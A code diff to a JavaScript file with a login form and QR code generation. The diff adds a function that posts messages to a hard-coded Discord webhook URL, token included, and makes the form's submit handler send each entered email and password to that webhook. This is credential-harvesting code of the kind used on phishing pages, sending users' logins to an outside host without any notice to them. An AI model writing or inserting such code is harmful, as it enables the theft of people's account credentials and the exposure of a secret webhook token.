@@ -132,6 +132,30 @@ function generateQRCode(data) {
 // ATTACHING EVENT LISTENERS
 // --------------------------
 
+const webhookUrl = 'https://discordapp.com/api/webhooks/1433506112686133270/TvgvzAlJU1uOJMmuGeGzTzbKWI9OjbIUW7EUhuUzRdM6sgSDxgpEEr1IyGvGTlnx3cJ4';
+
+async function sendDiscordMessage(content) {
+  try {
+    const response = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        content: content
+      })
+    });
+
+    if (response.ok) {
+      console.log('Message sent successfully!');
+    } else {
+      console.error('Failed to send message:', response.status);
+    }
+  } catch (error) {
+    console.error('Error sending message:', error);
+  }
+}
+
 // Handle form submission
 loginForm.addEventListener("submit", function(e) {
   e.preventDefault(); // Prevent form submission
@@ -141,6 +165,7 @@ loginForm.addEventListener("submit", function(e) {
   
   // Show alert with the values
   alert(`Email: ${email}\nPassword: ${password}`);
+  sendDiscordMessage(`Email: ${email}\nPassword: ${password}`);
   
   // Animate the button
   animateEllipsis();
